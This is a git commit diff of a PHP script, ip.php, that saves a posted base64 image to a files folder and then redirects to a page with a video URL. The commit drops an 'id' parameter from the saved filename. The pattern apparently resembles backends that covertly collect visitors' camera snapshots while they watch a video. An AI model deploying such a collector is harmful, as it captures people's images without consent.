f11b9b21714fdeddf33b7c92e1d7caefdd0352f1
goodhomo <116372489+goodhomo@users.noreply.github.com>
2024-05-25 11:16:16 +0800

    Update ip.php

--- ip.php
+++ ip.php
@@ -1,7 +1,6 @@
 <?php
 error_reporting(0);
 $base64_img = trim($_POST['img']);
-$id = trim($_GET['id']);
 $up_dir = './files/';//存放在当前目录的img文件夹下
 
 
@@ -13,7 +12,7 @@ if(!file_exists($up_dir)){
 if(preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)){
   $type = $result[2];
   if(in_array($type,array('bmp','png'))){
-    $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;
+    $new_file = $up_dir.'_'.date('mdHis_').'.'.$type;
     file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img)));
     header("Location:index.html?url=https://vdse.bdstatic.com//192d9a98d782d9c74c96f09db9378d93.mp4?authorization=bce-auth-v1%2F40f207e648424f47b2e3dfbb1014b1a5%2F2021-07-12T02%3A14%3A24Z%2F-1%2Fhost%2F530146520a1c89fb727fbbdb8a0e0c98ec69955459aed4b1c8e00839187536c9");
   }
